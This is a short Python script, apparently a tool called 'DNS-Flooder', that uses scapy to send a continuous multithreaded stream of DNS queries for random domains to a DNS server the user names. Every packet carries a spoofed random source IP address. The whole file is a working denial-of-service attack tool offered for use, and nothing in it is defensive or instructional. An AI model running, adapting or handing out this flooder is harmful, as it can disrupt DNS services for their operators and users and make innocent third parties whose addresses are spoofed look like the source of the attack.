from scapy.all import *
from time import sleep
import random
import string
import threading

delay = 1
threads = 4

def perform_query(dns, domain, sourceIP):
    packet = IP(src=sourceIP, dst=dns) / UDP() / DNS(rd=1, qd=DNSQR(qname=domain))
    send(packet)

def getRandDomain():
   letters = string.ascii_lowercase
   return ''.join(random.choice(letters) for i in range(6))

def getRandomIP():
    genIP = f"{random.randint(1,250)}.{random.randint(1,250)}.{random.randint(1,250)}.{random.randint(1,250)}"
    return genIP

def flood(): 
    while True:
        global answ
        domainToUse = getRandDomain()
        ipToUse = getRandomIP()
        try:
            answ = perform_query(userDNS, f"{domainToUse}.com", ipToUse)
        except:
            domainToUse = getRandDomain()
        sleep(delay)

def startThreads():
    for i in range(1,threads):
        t = threading.Thread(target=flood)
        t.start()

print("DNS-Flooder v0.0.2")
sleep(1)
print("RUN THIS SCRIPT AS ROOT OR IT WILL NOT WORK!")
sleep(1)

userDelay = input(f"Delay between requests (def {delay}s): ")
userDNS = input("DNS Server to use: ")
userThreads = input(f"Threads to use (def {threads}): ")

if userDelay == '':
    print(f"Using Default Delay of {delay}")
    sleep(0.5)
else:
    print(f"Using Delay of {userDelay}")
    delay = float(userDelay)
    sleep(0.5)

if userThreads == '':
    print(f"Using Default Threads count of {threads}")
    sleep(0.5)
else:
    print(f"Using Threads count of {userThreads}")
    threads = int(userThreads)
    sleep(0.5)

print(f"Starting Flood of {userDNS} in 3 seconds ...")
sleep(3)
print(f"Flooding...")

startThreads()